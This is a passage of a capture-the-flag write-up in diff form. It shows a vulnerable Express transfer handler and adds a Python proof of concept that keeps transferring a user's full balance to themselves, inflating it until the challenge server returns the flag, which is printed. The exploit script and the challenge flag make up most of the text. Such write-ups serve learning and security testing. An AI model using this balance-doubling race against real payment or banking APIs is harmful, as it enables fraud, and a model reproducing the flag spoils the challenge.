@@ -237,3 +237,37 @@ app.post('/api/transfer', (req, res) => {
 balances.set(fromUser, fromBalance - amount);
     balances.set(toUser, toBalance + amount);
 ```
+
+- Proof-of-concept-:
+
+```python3
+#! /usr/bin/env python3
+import requests
+import asyncio
+
+url = "http://34.170.146.252:48620"
+user_id = requests.post(url + "/api/register").json()["user"]
+
+async def check_balance(user_id: str) -> int:
+    data = requests.get(url+"/api/user/"+user_id).json()
+    print(data)
+    if  data["flag"] != None:
+        print(data["flag"])
+        exit()
+    return data["balance"]
+async def main():
+    while True: 
+      balance = await check_balance(user_id)
+      data = {"fromUser":user_id,"toUser":user_id,"amount": balance}
+      headers =  {"Content-Type":"application/json"}
+      requests.post(url+"/api/transfer",json=data)
+
+if __name__ == "__main__":
+    asyncio.run(main())
+```
+
+- Flag-:```Alpaca{this_weekend_is_SECCON_CTF_14_Quals_dont_miss_it}```
+
+<img width="1597" height="790" alt="image" src="https://github.com/user-attachments/assets/5e190596-0320-4593-9264-6e764c76a85d" />
+
+- 
